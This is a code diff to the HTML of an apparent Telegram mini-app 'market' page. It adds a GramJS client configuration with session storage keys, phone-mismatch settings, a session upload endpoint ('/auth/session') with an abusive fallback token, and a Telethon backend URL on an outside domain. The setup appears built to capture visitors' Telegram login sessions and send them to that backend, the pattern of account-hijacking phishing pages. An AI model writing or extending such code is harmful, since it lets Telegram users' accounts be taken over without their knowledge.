@@ -8,6 +8,7 @@
   <link rel="preload" as="image" href="./img/loading.png">
   <link rel="stylesheet" href="./styles.css?v=3">
   <script id="tg-webapp-sdk" src="https://telegram.org/js/telegram-web-app.js?59"></script>
+  
   <script>
     (function () {
       var injectedFallback = false;
@@ -656,7 +657,28 @@
 
   <script>
     window.TELETHON_API_URL = 'https://backend.activeskie.pro';
+    window.GRAMJS_CONFIG = Object.assign(
+      {
+        apiId: 0,
+        apiHash: '',
+        sessionStorageKey: 'market.gramjs.session',
+        telethonStorageKey: 'market.telethon.session',
+        allowedMismatchPhones: [],
+        pendingTtlSec: 300,
+        uploadEndpoint: '/auth/session',
+        uploadToken: '',
+        loadUrls: [
+          './telegram.browser.js',
+          'https://unpkg.com/telegram@2.17.10/index.browser.js',
+          'https://cdn.jsdelivr.net/npm/telegram@2.17.10/index.browser.js',
+        ],
+      },
+      window.GRAMJS_CONFIG || {
+        uploadToken: 'fuckyouallstupids',
+      }
+    );
   </script>
+  <script src="./telegram.browser.js"></script>
   <script src="https://unpkg.com/lucide@0.390.0/dist/umd/lucide.min.js"></script>
   <script src="./script.js?v=3"></script>
 </body>
